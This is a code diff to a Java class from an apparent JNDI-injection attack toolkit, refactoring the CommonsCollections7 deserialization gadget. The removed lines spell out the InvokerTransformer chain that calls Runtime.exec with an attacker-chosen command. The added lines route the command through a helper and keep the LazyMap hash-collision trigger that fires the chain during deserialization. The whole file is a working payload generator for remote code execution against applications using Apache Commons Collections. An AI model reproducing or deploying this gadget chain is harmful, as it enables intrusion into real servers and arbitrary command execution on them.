@@ -2,6 +2,7 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -14,28 +15,14 @@ import java.util.HashMap;
 import java.util.Hashtable;
 import java.util.Map;
 
-public class CommonsCollections7 {
+public class CommonsCollections7 implements ObjectPayload<Hashtable> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        final String[] execArgs = new String[]{String.valueOf(type)};
-
-        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
-
-        final Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod",
-                        new Class[]{String.class, Class[].class},
-                        new Object[]{"getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke",
-                        new Class[]{Object.class, Object[].class},
-                        new Object[]{null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class},
-                        execArgs),
-                new ConstantTransformer(1)};
-
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String              command          = param[0];
+        final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
+        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
+        Map                 innerMap1        = new HashMap();
+        Map                 innerMap2        = new HashMap();
 
         // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
         Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
@@ -62,5 +49,10 @@ public class CommonsCollections7 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Hashtable getObject(String command) throws Exception {
+        return null;
     }
 }
